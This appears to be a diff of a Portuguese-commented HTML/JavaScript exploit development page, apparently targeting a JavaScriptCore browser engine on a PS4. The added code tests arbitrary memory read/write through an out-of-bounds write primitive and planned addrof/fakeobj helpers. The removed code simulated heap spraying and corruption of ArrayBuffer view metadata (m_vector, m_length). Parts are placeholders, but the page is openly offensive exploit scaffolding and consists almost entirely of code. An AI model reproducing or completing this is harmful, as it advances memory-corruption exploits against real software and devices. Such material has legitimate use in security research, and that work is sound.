+            //    log("Tente interagir com ele via memory_tools (ex: memory_tools.read_u32(target_address_for_fakeobj))", "info");
+            //    memory_tools.fakeobj = fakeobj_REAL;
+            //    memory_tools.read_u32 = (addr) => { /* use o fakeobj para ler */ };
+            //    memory_tools.write_u32 = (addr, val) => { /* use o fakeobj para escrever */ };
+            //    memory_tools.is_ready = true;
+            // } else {
+            //    log("Falha ao criar objeto falso.", "error", FNAME);
+            // }
+            log("Implementação de fakeobj_REAL e memory_tools necessária usando sua primitiva OOB Write e offsets.", "critical", FNAME);
+        }
+        
+        async function runTestArbitraryRW() {
+            const FNAME = "runTestArbitraryRW";
+            log("--- Testando Leitura/Escrita Arbitrária ---", "test", FNAME);
+            if (!memory_tools.is_ready) {
+                log("Ferramentas de memória (addrof/fakeobj) não estão prontas. Tente construí-las primeiro.", "error", FNAME);
+                // Tenta usar triggerRealOOBRead/Write diretamente como um fallback mais básico
+                if (!setupMyOOBPrimitive()) return;
+                log("Tentando R/W direto com triggerRealOOB (se implementado e m_vector de oob_capable_dataview corrompido).", "warn", FNAME);
+            }
+
+            const address_hex = document.getElementById('rw-address-hex').value;
+            const value_hex = document.getElementById('rw-value-hex').value;
+            const address_to_rw = new AdvancedInt64(address_hex);
+            const value_to_write_u32 = parseInt(value_hex, 16);
+
+            if (isNaN(value_to_write_u32)) {
+                log("Valor para escrita inválido.", "error", FNAME); return;
+            }
+
+            log(`Alvo R/W: Endereço ${address_to_rw.toString(true)}, Valor para Escrita U32: 0x${value_to_write_u32.toString(16)}`, "info", FNAME);
+
+            // Tentativa de Escrita
+            let write_ok = false;
+            if (memory_tools.is_ready && memory_tools.write_u32) {
+                log("Usando memory_tools.write_u32...", "info");
+                // memory_tools.write_u32(address_to_rw, value_to_write_u32); // Descomente quando implementado
+                write_ok = true; // Assuma que funcionou para o placeholder
+            } else { // Fallback para triggerRealOOBWrite (mais direto, mas menos flexível)
+                log("Usando triggerRealOOBWrite (direto)...", "info");
+                write_ok = triggerRealOOBWrite(address_to_rw, value_to_write_u32, 4);
+            }
+
+            if (write_ok) {
+                log(`Escrita (potencial) de 0x${value_to_write_u32.toString(16)} em ${address_to_rw.toString(true)} concluída.`, "good", FNAME);
+                await PAUSE(100); // Pausa antes de ler de volta
+
+                // Tentativa de Leitura
+                let read_value = null;
+                if (memory_tools.is_ready && memory_tools.read_u32) {
+                     log("Usando memory_tools.read_u32...", "info");
+                    // read_value = memory_tools.read_u32(address_to_rw); // Descomente
                 } else {
-                    log("Range de dump inválido para o buffer de simulação.", "warn", FNAME)
+                    log("Usando triggerRealOOBRead (direto)...", "info");
+                    read_value = triggerRealOOBRead(address_to_rw, 4);
                 }
 
-
-                if (hexPatternToSearch) {
-                    const matches = searchPatternInView(full_dv, dumpStart, dumpLength, hexPatternToSearch);
-                    if (matches.length > 0) {
-                        log(`Padrão '${hexPatternToSearch}' ENCONTRADO nos seguintes offsets (absolutos na simulação):`, "match", FNAME);
-                        matches.forEach(matchAddr => log(`  0x${matchAddr.toString(16)}`, "match"));
+                if (read_value !== null) {
+                    log(`Valor lido de ${address_to_rw.toString(true)}: 0x${Number(read_value).toString(16).padStart(8,'0')}`, "leak", FNAME);
+                    if (Number(read_value) === value_to_write_u32) {
+                        log("VERIFICAÇÃO R/W BEM-SUCEDIDA!", "vuln", FNAME);
                     } else {
-                        log(`Padrão '${hexPatternToSearch}' NÃO encontrado na região lida.`, "good", FNAME);
+                        log("Verificação R/W falhou: valor lido difere do escrito.", "warn", FNAME);
                     }
+                } else {
+                    log(`Falha ao ler de ${address_to_rw.toString(true)}.`, "error", FNAME);
                 }
-
-                log("--- Interpretação Detalhada (offsets relativos ao fim do buffer base) ---", "info", FNAME);
-                for (let offset = readStartOffset; offset <= readEndOffset; offset += 4) { // Passo de 4 bytes
-                    const current_read_addr_in_full_buffer = oob_buffer_end_addr_in_full_buffer + offset;
-                    let logMsg = `Rel Offset: ${offset.toString().padStart(5, ' ')} (Abs Sim: ${current_read_addr_in_full_buffer}) | `;
-
-                    if (current_read_addr_in_full_buffer < 0 || current_read_addr_in_full_buffer + 4 > allocationSize) continue;
-
-                    if (interpretAs === "u64_u32") {
-                        if (current_read_addr_in_full_buffer + 8 <= allocationSize) {
-                            const val_u64 = readWriteUtils.read_u64_le(full_dv, current_read_addr_in_full_buffer);
-                             // Heurística simples para ponteiros (ex: não zero, não padrão de preenchimento)
-                            let type = "U64_DATA";
-                            if (!val_u64.isZero() && (val_u64.high() !== 0x41414141 || val_u64.low() !== 0x41414141) ) { // Não é AAAA...
-                                if (val_u64.high() === 0 && val_u64.low() > 0x100000 && val_u64.low() < 0x80000000) type = "U64_PTR_LOW?";
-                                else if (val_u64.high() > 0x0 && val_u64.high() < 0x00000010) type = "U64_PTR_CODE/SYS?"; // Chute PS4
-                                else if (val_u64.high() === 0x00000001) type = "U64_PTR_HEAP_PS4?"; // Outro chute
-                                logMsg += `U64: ${val_u64.toString(true)} (${type})`;
-                                log(logMsg, "leak");
-                                continue; // Próximo offset
-                            }
-                        }
-                        const val_u32 = readWriteUtils.read_u32_le(full_dv, current_read_addr_in_full_buffer);
-                        logMsg += `U32: 0x${val_u32.toString(16).padStart(8,'0')}`;
-                        log(logMsg, "data");
-
-                    } else if (interpretAs === "strings") {
-                        let str = "";
-                        for (let k=0; k<32 && (current_read_addr_in_full_buffer + k < allocationSize) ; k++) { // Lê até 32 bytes para string
-                            const charCode = readWriteUtils.read_u8(full_dv, current_read_addr_in_full_buffer + k);
-                            if (charCode >= 32 && charCode <= 126) str += String.fromCharCode(charCode);
-                            else if (charCode === 0) break; // Null terminator
-                            else str += '.';
-                        }
-                        if (str.length > 1 && str !== "................") { // String significativa
-                           logMsg += `ASCII: "${str}"`;
-                           log(logMsg, "leak");
-                        }
-                    } else if (interpretAs === "float64") {
-                         if (current_read_addr_in_full_buffer + 8 <= allocationSize) {
-                            const val_f64 = readWriteUtils.read_f64_le(full_dv, current_read_addr_in_full_buffer);
-                            if (Math.abs(val_f64) > 1e-5 && Math.abs(val_f64) < 1e10 && !isNaN(val_f64) ) { // Filtra zeros e NaNs
-                                logMsg += `Float64: ${val_f64}`;
-                                log(logMsg, "data");
-                            }
-                        }
-                    }
-                    if (offset % 64 === 0) await PAUSE(1);
-                }
-                log("--- Varredura de memória (simulada OOB) concluída ---", "test", FNAME);
-
-            } catch (e) {
-                log(`Erro durante Leitura OOB Extensiva: ${e.message}\n${e.stack}`, "error", FNAME);
-                console.error(e);
+            } else {
+                log(`Falha ao escrever em ${address_to_rw.toString(true)}.`, "error", FNAME);
             }
         }
 
-        async function runCorruptArrayBufferMetadataTest() {
-            const FNAME = "runCorruptArrayBufferMetadataTest";
-            log("--- Iniciando Teste de Corrupção de Metadados de ArrayBuffer V2 ---", "test", FNAME);
-
-            const oobBufferSize = parseInt(document.getElementById('oob-buffer-size').value);
-            // Este offset é crucial: é a distância entre o FIM do buffer atacante e o INÍCIO da ESTRUTURA DataView/ArrayBufferView da vítima.
-            // Se o atacante está em [A], vítima em [V], e OOB Write acontece em FIM(A)+X,
-            // queremos que FIM(A)+X seja o endereço de INÍCIO(V) + offset_para_m_vector/m_length.
-            // Simplificando: `relativeWriteOffsetToVictimMetadata` é o offset da escrita OOB que PODE atingir metadados.
-            const oobWriteOffsetFromAttackerEnd = parseInt(document.getElementById('oob-write-offset-relative').value);
-            const oobWriteValue = parseInt(document.getElementById('oob-write-value-hex').value, 16);
-
-            const numSpray = parseInt(document.getElementById('num-spray-buffers').value);
-            const victimSize = parseInt(document.getElementById('victim-buffer-size').value);
-            const newVectorLow = parseInt(document.getElementById('new-mvector-low').value, 16);
-            const newVectorHigh = parseInt(document.getElementById('new-mvector-high').value, 16);
-            const newLength = parseInt(document.getElementById('new-mlength').value);
-
-            if (isNaN(oobBufferSize) || isNaN(oobWriteOffsetFromAttackerEnd) || isNaN(oobWriteValue) || isNaN(numSpray) || isNaN(victimSize) ||
-                isNaN(newVectorLow) || isNaN(newVectorHigh) || isNaN(newLength)) {
-                log("Configurações de corrupção inválidas.", "error", FNAME); return;
-            }
-            const newVector = AdvancedInt64.fromParts(newVectorLow, newVectorHigh);
-            log(`Alvo: Corromper m_vector para ${newVector.toString(true)} e m_length para ${newLength} (0x${newLength.toString(16)})`, "info", FNAME);
-
-            // --- Simulação de Heap ---
-            // Criamos uma grande ArrayBuffer para simular a heap.
-            // Os buffers "atacante" e "vítimas" serão visualizados como DataViews dentro desta heap simulada.
-            const HEAP_SIM_SIZE = numSpray * (victimSize + 64) + oobBufferSize + 2048; // Estimativa
-            const heap_sim_buffer = new ArrayBuffer(HEAP_SIM_SIZE);
-            const heap_sim_dv = new DataView(heap_sim_buffer);
-            let currentHeapOffset = 0;
-            log(`Heap simulada criada com ${HEAP_SIM_SIZE} bytes.`, "info", FNAME);
-
-            // 1. "Alocar" o buffer atacante na heap simulada
-            const attackerBaseInHeap = currentHeapOffset;
-            // O DataView do atacante cobre apenas sua parte "legítima"
-            const attackerLegitDV = new DataView(heap_sim_buffer, attackerBaseInHeap, oobBufferSize);
-            currentHeapOffset += oobBufferSize + 32; // Gap para simular alinhamento/padding
-            log(`Buffer atacante (legítimo) "alocado" em 0x${attackerBaseInHeap.toString(16)} na heap sim. Tamanho: ${oobBufferSize}`, "info", FNAME);
-
-            // 2. "Alocar" os buffers vítima
-            const victimMetaPointers = []; // Armazena {baseOffset, mVectorOffset, mLengthOffset, originalVector, originalLength}
-
-            for (let i = 0; i < numSpray; i++) {
-                if (currentHeapOffset + victimSize + 64 > HEAP_SIM_SIZE) {
-                    log("Heap simulada cheia antes de alocar todas as vítimas.", "warn", FNAME); break;
-                }
-                const victimBaseInHeap = currentHeapOffset;
-                // A estrutura JSArrayBufferView/DataView simulada: [header?][m_vector_ptr][m_length][m_mode][padding?] [buffer_data]
-                // Assumimos que os metadados (m_vector, m_length) estão no início da "alocação" do DataView.
-                const victimDataOffsetInHeap = victimBaseInHeap + 32; // Onde os dados reais do ArrayBuffer começariam (simulado)
-                
-                // Escreve metadados FALSOS para a vítima na heap simulada
-                const mVectorOffsetInHeap = victimBaseInHeap + jscOffsets.array_buffer_view_m_vector;
-                const mLengthOffsetInHeap = victimBaseInHeap + jscOffsets.array_buffer_view_m_length;
-                
-                // Simula o m_vector original apontando para os dados da vítima
-                readWriteUtils.write_u64_le(heap_sim_dv, mVectorOffsetInHeap, new AdvancedInt64(victimDataOffsetInHeap, 0)); // Aponta para dentro da heap_sim
-                readWriteUtils.write_u32_le(heap_sim_dv, mLengthOffsetInHeap, victimSize); // Tamanho original
-                
-                victimMetaPointers.push({
-                    victimNum: i,
-                    baseOffsetInSimHeap: victimBaseInHeap, // Endereço da "estrutura DataView" da vítima
-                    mVectorOffsetInSimHeap: mVectorOffsetInHeap,
-                    mLengthOffsetInSimHeap: mLengthOffsetInHeap,
-                    originalVectorVal: new AdvancedInt64(victimDataOffsetInHeap, 0),
-                    originalLengthVal: victimSize
-                });
-                currentHeapOffset += victimSize + 32; // Próxima vítima, com gap
-            }
-            log(`${victimMetaPointers.length} buffers vítima (com metadados simulados) "alocados" na heap sim.`, "info", FNAME);
-
-            // 3. Simular a Escrita OOB do Atacante
-            // Onde a escrita OOB efetivamente acontece na heap simulada:
-            const actual_oob_write_addr_in_heap_sim = attackerBaseInHeap + oobBufferSize + oobWriteOffsetFromAttackerEnd;
-            log(`Escrita OOB do atacante ocorrerá em 0x${actual_oob_write_addr_in_heap_sim.toString(16)} na heap sim.`, "info", FNAME);
-            readWriteUtils.write_u32_le(heap_sim_dv, actual_oob_write_addr_in_heap_sim, oobWriteValue); // A escrita OOB de 4 bytes
-
-            // 4. Verificar qual vítima (se alguma) foi atingida pela escrita OOB e se os metadados podem ser corrompidos
-            let corruptedVictimFound = false;
-            for (const victim of victimMetaPointers) {
-                // O `actual_oob_write_addr_in_heap_sim` é onde nosso valor OOB foi escrito.
-                // Queremos que este endereço seja o início de onde vamos escrever o NOVO m_vector ou m_length.
-                // Para corromper m_vector da vítima: `actual_oob_write_addr_in_heap_sim` deve ser == `victim.mVectorOffsetInSimHeap`
-                // Para corromper m_length da vítima: `actual_oob_write_addr_in_heap_sim` deve ser == `victim.mLengthOffsetInSimHeap`
-
-                // Tentativa de corromper m_vector:
-                // Se a escrita OOB (de 4 bytes) atingiu o início do m_vector (8 bytes)
-                if (actual_oob_write_addr_in_heap_sim >= victim.mVectorOffsetInSimHeap &&
-                    actual_oob_write_addr_in_heap_sim < victim.mVectorOffsetInSimHeap + 8) {
-                    log(`Vítima ${victim.victimNum} em 0x${victim.baseOffsetInSimHeap.toString(16)} PODE ter m_vector atingido pela escrita OOB!`, "warn", FNAME);
-                    log(`  Escrita OOB em 0x${actual_oob_write_addr_in_heap_sim.toString(16)}, m_vector da vítima está em 0x${victim.mVectorOffsetInSimHeap.toString(16)}.`, "info");
-
-                    // Simula a sobrescrita completa de m_vector e m_length com os novos valores
-                    // Isso requer que a primitiva OOB Write seja mais potente (ex: escrever 12 bytes, não só 4)
-                    // Ou que tenhamos múltiplas escritas OOB controladas.
-                    // Para este teste, vamos assumir que temos uma escrita OOB capaz de sobrescrever m_vector e m_length
-                    // se o `oobWriteOffsetFromAttackerEnd` estiver posicionado corretamente para o *início* do m_vector.
-                    if (actual_oob_write_addr_in_heap_sim === victim.mVectorOffsetInSimHeap) {
-                         log(`ALVO PRECISO! Escrita OOB alinhada com m_vector da Vítima ${victim.victimNum}. Tentando corrupção...`, "critical", FNAME);
-                        readWriteUtils.write_u64_le(heap_sim_dv, victim.mVectorOffsetInSimHeap, newVector);
-                        readWriteUtils.write_u32_le(heap_sim_dv, victim.mLengthOffsetInSimHeap, newLength);
-                        log(`  Vítima ${victim.victimNum}: m_vector sobrescrito para ${newVector.toString(true)}, m_length para ${newLength}`, "vuln", FNAME);
-                        
-                        // Agora, simular o uso do buffer corrompido
-                        const corrupted_victim_view = new DataView(heap_sim_buffer, newVector.low(), newLength); // Usa o NOVO m_vector (apenas low part para JS) e m_length
-                        log(`  Tentando ler U32 do novo m_vector (0x${newVector.low().toString(16)}) da Vítima ${victim.victimNum}...`, "info", FNAME);
-                        try {
-                            // Precisa garantir que newVector.low() + newLength não exceda heap_sim_buffer.byteLength
-                            // Ou, em um cenário real, que a memória em newVector é acessível.
-                            if(newVector.low() + 4 <= heap_sim_buffer.byteLength) { // Simulação dentro da nossa heap
-                                const val = readWriteUtils.read_u32_le(corrupted_victim_view, 0);
-                                log(`  Valor lido do endereço ${newVector.toString(true)}: 0x${val.toString(16).padStart(8,'0')}`, "leak", FNAME);
-                                log(`  Sucesso! Primitiva de R/W Arbitrário (limitada à heap sim.) obtida na Vítima ${victim.victimNum}.`, "vuln", FNAME);
-                            } else {
-                                log(`  Novo m_vector ${newVector.toString(true)} aponta para fora da heap simulada. Leitura real seria necessária.`, "warn", FNAME);
-                            }
-                        } catch (e) {
-                            log(`  Erro ao usar DataView corrompido: ${e.message}`, "error", FNAME);
-                        }
-                        corruptedVictimFound = true;
-                        break; 
-                    }
-                }
-            }
-
-            if (!corruptedVictimFound) {
-                log("Nenhuma vítima parece ter sido corrompida de forma útil com a escrita OOB única de 4 bytes nas configurações atuais.", "warn", FNAME);
-                log("Isso geralmente requer múltiplas escritas OOB, ou uma escrita OOB maior, e alinhamento perfeito.", "info");
-            }
-            log("--- Teste de Corrupção de Metadados Concluído ---", "test", FNAME);
-        }
+        // Inicialização ao carregar
+        window.onload = () => {
+            log("Script V3 carregado. Preencha os placeholders e os offsets corretos.", "info", "Init");
+            log("Lembre-se: esta ferramenta é para pesquisa avançada e requer conhecimento do seu bug específico.", "warn", "Init");
+        };
 
     </script>
 </body>
